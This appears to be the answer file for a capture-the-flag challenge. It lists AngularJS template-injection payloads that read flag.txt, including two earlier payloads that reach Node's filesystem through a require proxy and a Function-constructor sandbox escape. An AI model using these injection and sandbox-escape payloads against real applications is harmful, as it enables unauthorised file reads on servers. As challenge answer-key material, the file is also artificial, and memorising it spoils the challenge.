<!--
Copyright 2018 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
-->

# Expected
```
{{window.angular.element(window.document.body).injector().get('i18n').template('flag.txt')}}
```

or simply

```
{{i18n.template('flag.txt')}}
```

if you inject in the right place

## Obsolete payloads

rjamet (disabled by removing the require proxy, that was lame):
```
{{window.angular.element(window.document.body).injector().get('safeRequire')('fs').readFileSync('./flag.txt')}}
```

epuig (disabled by wrapping AngularJS in vm2, that was too generic):
```
{{''.constructor.constructor('return b=new Buffer(100),process.binding("fs").read(process.binding("fs").open("flag.txt", 0, 0755), b, 0, 100),b+""')()}}
```
